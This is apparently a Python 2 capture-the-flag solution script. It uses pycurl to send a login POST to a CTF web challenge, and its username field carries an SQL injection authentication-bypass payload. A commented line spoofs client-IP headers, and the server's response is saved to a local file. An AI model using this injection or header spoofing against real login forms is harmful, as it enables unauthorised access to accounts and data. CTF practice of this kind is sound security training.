import pycurl
import cStringIO
import urllib
c = pycurl.Curl()
url = "http://ctf1.simplexue.com/web/4/index.php"
# print(dir(c))
c.setopt(pycurl.URL, url)
# b = StringIO.StringIO()
b = cStringIO.StringIO()
c.setopt(pycurl.WRITEFUNCTION, b.write)
c.setopt(pycurl.FOLLOWLOCATION, 1)
#c.setopt(pycurl.HTTPHEADER, ['CLIENT-IP:1.1.1.1', 'HTTP_X_FORWARDED_FOR:1.1.1.1'])
post_data_dic = {"user":"a\' or 1 #-- ", "pass":"1"}
#50347a3f14aea923e9f8eac867fd3bb1
c.setopt(c.POSTFIELDS, urllib.urlencode(post_data_dic))

c.perform()

html = b.getvalue()
print html

print("EFFECTIVE_URL: ", c.getinfo(pycurl.EFFECTIVE_URL))  
print("RESPONSE_CODE: ", c.getinfo(pycurl.RESPONSE_CODE))  
print("HTTP_CONNECTCODE: ", c.getinfo(pycurl.HTTP_CONNECTCODE))
print("INFO_FILETIME: ", c.getinfo(pycurl.INFO_FILETIME))
print("HTTP_CODE: ", c.getinfo(pycurl.HTTP_CODE))
print("TOTAL_TIME: ", c.getinfo(pycurl.TOTAL_TIME))
# print(html)

fp = open("C:\\Users\\Administrator\\Desktop\\baidu.html", "w+")
print >> fp, html

"""
http://www.xttttt.com/arthtml/08/14231.html
"""